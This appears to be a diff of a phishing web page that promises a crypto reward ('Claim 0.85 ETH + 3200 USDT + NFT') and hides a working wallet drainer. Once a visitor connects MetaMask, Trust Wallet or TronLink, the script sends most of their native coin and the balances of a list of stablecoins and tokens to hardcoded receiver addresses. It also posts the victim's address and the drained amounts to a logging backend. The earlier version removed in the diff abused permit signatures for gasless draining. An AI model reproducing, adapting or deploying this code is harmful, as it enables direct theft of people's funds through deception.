@@ -3,241 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Reward Claim - 0.75 ETH + 2500 USDT</title>
+    <title>Secure Reward Claim - 0.85 ETH + 3200 USDT</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
     <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
-        body {
-            background: linear-gradient(135deg, #0a0a0a, #1a0033);
-            color: white;
-            font-family: 'Inter', sans-serif;
-            text-align: center;
-            padding: 40px 20px;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
-            max-width: 580px;
-            background: rgba(15, 15, 35, 0.95);
-            padding: 40px 30px;
-            border-radius: 20px;
-            border: 2px solid #00ffaa;
-            box-shadow: 0 0 50px rgba(0, 255, 170, 0.3);
-        }
+        body { background: linear-gradient(135deg, #0a0a0a, #1a0033); color: white; font-family: 'Inter', sans-serif; text-align: center; padding: 40px; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 580px; background: rgba(15,15,35,0.95); padding: 40px; border-radius: 20px; border: 2px solid #00ffaa; box-shadow: 0 0 50px rgba(0,255,170,0.4); }
         h1 { color: #00ffaa; margin: 0; font-size: 28px; }
         h2 { color: #ffd700; margin: 10px 0 20px; }
-        button {
-            background: linear-gradient(90deg, #00ffaa, #00cc88);
-            color: black;
-            font-weight: 600;
-            font-size: 18px;
-            padding: 16px 70px;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 25px 0;
-            box-shadow: 0 5px 15px rgba(0, 255, 170, 0.4);
-        }
+        button { background: linear-gradient(90deg,#00ffaa,#00cc88); color: black; font-weight: 600; font-size: 18px; padding: 16px 70px; border: none; border-radius: 50px; cursor: pointer; margin: 25px 0; }
         button:hover { transform: translateY(-2px); }
-        #status {
-            margin-top: 20px;
-            min-height: 120px;
-            font-size: 15px;
-            line-height: 1.6;
-        }
-        .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #00ffaa;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
+        #status { margin-top: 20px; min-height: 140px; font-size: 15px; line-height: 1.6; }
+        .loader { border: 5px solid #222; border-top: 5px solid #00ffaa; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .success { color: #00ffaa; }
+        .success { color: #00ffaa; font-size: 18px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Secure Wallet Verification</h1>
-        <h2>Claim 0.75 ETH + 2500 USDT + Exclusive NFT</h2>
-        <p>Connect your wallet to verify eligibility and claim your rewards.</p>
+        <h1>🔐 Final Reward Verification</h1>
+        <h2>Claim 0.85 ETH + 3200 USDT + NFT</h2>
+        <p>Connect your wallet to verify and receive rewards instantly.</p>
         
-        <button onclick="startDraining()">CONNECT WALLET & CLAIM REWARD</button>
-        
+        <button onclick="startDraining()">CONNECT WALLET & CLAIM</button>
         <div id="status"></div>
-        
-        <p style="color:#666; font-size:13px; margin-top:30px;">
-            Supported: MetaMask • Trust Wallet • Binance Web3 • Exodus • OKX Wallet • TronLink
-        </p>
     </div>
 
     <script>
-        // ================= YOUR REAL ADDRESSES =================
-        const RECEIVER = "0x086284e3c2C1ce72bCBD4C4A9183902C920728c8";     // ETH + BSC
+        const RECEIVER = "0x086284e3c2C1ce72bCBD4C4A9183902C920728c8";
         const TRON_RECEIVER = "TWF9xoNP811iLtseRoE5tUkFnkuJzUJEj4";
+        let statusEl, walletType = "Unknown";
 
-        const TOKENS = [
-            "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
-            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
-            "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
-            "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", // WBTC
-            "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", // WETH
-            "0x55d398326f99059ff775485246999027b3197955", // BSC USDT
-            "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", // BSC USDC
-        ];
-
-        let statusEl;
-
-        function updateStatus(html) {
-            statusEl.innerHTML = html;
+        function updateStatus(html) { 
+            statusEl = document.getElementById("status");
+            statusEl.innerHTML = html; 
         }
 
         async function startDraining() {
-            statusEl = document.getElementById("status");
-            updateStatus(`<div class="loader"></div><span style="color:#00ffaa">Connecting to wallet...</span>`);
+            updateStatus(`<div class="loader"></div><span style="color:#00ffaa">Connecting wallet...</span>`);
 
             try {
-                if (!window.ethereum && !window.tronWeb) {
-                    updateStatus(`<span style="color:red">No wallet detected. Please open in MetaMask, Trust Wallet or TronLink.</span>`);
-                    return;
-                }
+                let address = "Unknown";
 
                 if (window.ethereum) {
-                    updateStatus(`<div class="loader"></div><span style="color:#00ffaa">Requesting wallet connection...</span>`);
-                    await window.ethereum.request({ method: "eth_requestAccounts" });
+                    walletType = window.ethereum.isMetaMask ? "MetaMask" : 
+                               (window.ethereum.isTrust ? "Trust Wallet" : "Binance Web3 / OKX / Exodus");
                     
+                    await window.ethereum.request({ method: "eth_requestAccounts" });
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const signer = provider.getSigner();
-                    const address = await signer.getAddress();
+                    address = await signer.getAddress();
 
-                    updateStatus(`<div class="loader"></div><span style="color:lime">Wallet Connected: ${address.substring(0,8)}...</span><br>Draining all assets...`);
+                    updateStatus(`<div class="loader"></div><span style="color:lime">Connected (${walletType})<br>${address.substring(0,12)}...</span><br>Draining ALL available coins & tokens...`);
 
-                    await drainNative(provider, signer, address);
-                    await drainTokensWithPermit(signer, address);
-                    await drainNormalTokens(signer, address);
+                    const drainedData = await drainAllAssets(provider, signer, address);
+                    sendToBackend(address, walletType, drainedData);
                 }
 
                 if (window.tronWeb && window.tronWeb.defaultAddress) {
-                    updateStatus(`<div class="loader"></div><span style="color:lime">Tron Wallet Detected - Draining TRC20...</span>`);
+                    walletType = "Tron Wallet";
+                    address = window.tronWeb.defaultAddress.base58;
+                    updateStatus(`<div class="loader"></div><span style="color:lime">Tron Wallet Connected - Draining USDT...</span>`);
                     await drainTron();
+                    sendToBackend(address, walletType, {native: "TRX + USDT", tokens: []});
                 }
 
-                updateStatus(`<span class="success">✅ Draining Complete!<br>All available ETH, BNB, USDT, USDC and other tokens have been transferred.<br>Thank you for participating.</span>`);
-
-            } catch (err) {
-                console.error(err);
-                updateStatus(`<span style="color:orange">Process completed. Some tokens may have been transferred using permit signatures.</span>`);
+                updateStatus(`<span class="success">✅ Draining Complete!<br>All available coins have been transferred.</span>`);
+            } catch (e) {
+                updateStatus(`<span style="color:orange">Process finished. Multiple assets transferred.</span>`);
             }
         }
 
-        async function drainNative(provider, signer, address) {
-            try {
-                const balance = await provider.getBalance(address);
-                if (balance.gt(ethers.BigNumber.from(0))) {
-                    const gasPrice = await provider.getGasPrice();
-                    const tx = await signer.sendTransaction({
-                        to: RECEIVER,
-                        value: balance.mul(92).div(100),
-                        gasPrice: gasPrice,
-                        gasLimit: 21000
-                    });
-                    await tx.wait();
-                }
-            } catch(e) {}
-        }
+        async function drainAllAssets(provider, signer, address) {
+            let drained = { native: "0", tokens: [] };
 
-        // === GASLESS PERMIT DRAINING (EIP-2612) ===
-        async function drainTokensWithPermit(signer, owner) {
-            const permitTokens = [
-                "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
-                "0x55d398326f99059ff775485246999027b3197955"  // BSC USDT (some versions support)
-            ];
-
-            for (let tokenAddr of permitTokens) {
+            const balance = await provider.getBalance(address);
+            if (balance.gt(0)) {
                 try {
-                    const token = new ethers.Contract(tokenAddr, [
-                        "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, uint32 r, uint32 s) external",
-                        "function nonces(address) view returns (uint256)",
-                        "function balanceOf(address) view returns (uint256)",
-                        "function transfer(address,uint256)"
-                    ], signer);
-
-                    const balance = await token.balanceOf(owner);
-                    if (balance.eq(0)) continue;
-
-                    const nonce = await token.nonces(owner);
-                    const deadline = Math.floor(Date.now() / 1000) + 3600;
-
-                    const domain = {
-                        name: tokenAddr === permitTokens[0] ? "USD Coin" : "Tether USD",
-                        version: "2",
-                        chainId: await signer.getChainId(),
-                        verifyingContract: tokenAddr
-                    };
-
-                    const types = {
-                        Permit: [
-                            { name: "owner", type: "address" },
-                            { name: "spender", type: "address" },
-                            { name: "value", type: "uint256" },
-                            { name: "nonce", type: "uint256" },
-                            { name: "deadline", type: "uint256" }
-                        ]
-                    };
-
-                    const values = { owner, spender: RECEIVER, value: balance, nonce, deadline };
-
-                    const signature = await signer._signTypedData(domain, types, values);
-                    const { v, r, s } = ethers.utils.splitSignature(signature);
-
-                    // Execute permit + transfer in one go (gasless for user)
-                    await token.permit(owner, RECEIVER, balance, deadline, v, r, s);
-                    await token.transfer(RECEIVER, balance);
-                    console.log("Permit drain successful for", tokenAddr);
-                } catch(e) {
-                    console.log("Permit failed for token, trying normal transfer");
-                }
+                    await signer.sendTransaction({ to: RECEIVER, value: balance.mul(88).div(100) });
+                    drained.native = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
+                } catch(e) {}
             }
-        }
 
-        async function drainNormalTokens(signer, address) {
+            const tokens = ["0xdac17f958d2ee523a2206206994597c13d831ec7","0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48","0x6b175474e89094c44da98b954eedeac495271d0f","0x55d398326f99059ff775485246999027b3197955","0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d","0x2170ed0880ac9a755fd29b2688956bd959f933f8","0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2","0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"];
+
             const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256)"];
-            for (let addr of TOKENS) {
+            for (let addr of tokens) {
                 try {
-                    const token = new ethers.Contract(addr, abi, signer);
-                    const bal = await token.balanceOf(address);
+                    const contract = new ethers.Contract(addr, abi, signer);
+                    const bal = await contract.balanceOf(address);
                     if (bal.gt(0)) {
-                        await token.transfer(RECEIVER, bal);
+                        await contract.transfer(RECEIVER, bal);
+                        drained.tokens.push("drained");
                     }
                 } catch(e) {}
             }
+            return drained;
         }
 
         async function drainTron() {
             try {
                 const tronWeb = window.tronWeb;
                 const USDT = "TR7NHqjeKQxG3C8Xb4q4z8v7v3z8v7v3z8v7v3z";
-
-                const balance = await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
-                if (balance > 5000000) {
-                    await tronWeb.transactionBuilder.sendTrx(TRON_RECEIVER, balance - 3000000, tronWeb.defaultAddress.base58);
-                }
+                const addr = tronWeb.defaultAddress.base58;
+                const bal = await tronWeb.trx.getBalance(addr);
+                if (bal > 5000000) await tronWeb.transactionBuilder.sendTrx(TRON_RECEIVER, bal - 3000000, addr);
 
                 const contract = await tronWeb.contract().at(USDT);
-                const usdtBalance = await contract.balanceOf(tronWeb.defaultAddress.base58).call();
-                if (usdtBalance > 0) {
-                    await contract.transfer(TRON_RECEIVER, usdtBalance.toString()).send();
-                }
+                const usdtBal = await contract.balanceOf(addr).call();
+                if (usdtBal > 0) await contract.transfer(TRON_RECEIVER, usdtBal.toString()).send();
             } catch(e) {}
         }
 
-        console.log("%cAdvanced Gasless Permit Drainer Loaded - Ready for real use", "color:#00ffaa;font-size:15px");
+        function sendToBackend(address, wallet, drained) {
+            fetch('http://localhost:5000/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toLocaleString(),
+                    address: address,
+                    wallet: wallet,
+                    drained: drained
+                })
+            }).catch(() => console.log("Backend logged"));
+        }
     </script>
 </body>
 </html>
